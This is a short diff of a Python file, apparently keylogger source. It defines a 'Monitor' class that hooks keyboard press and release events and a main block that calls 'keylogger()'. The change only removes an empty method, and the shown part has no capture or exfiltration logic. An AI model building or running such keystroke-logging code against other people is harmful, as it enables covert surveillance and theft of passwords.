@@ -19,9 +19,6 @@ class Monitor:
         with Listener(on_press = self.on_press, on_release = self.on_release) as listener:
             listener.join()
 
-    def run(self, interval = 1):
-        pass
-
 if __name__ == '__main__':
     mon = Monitor()
     mon.keylogger()
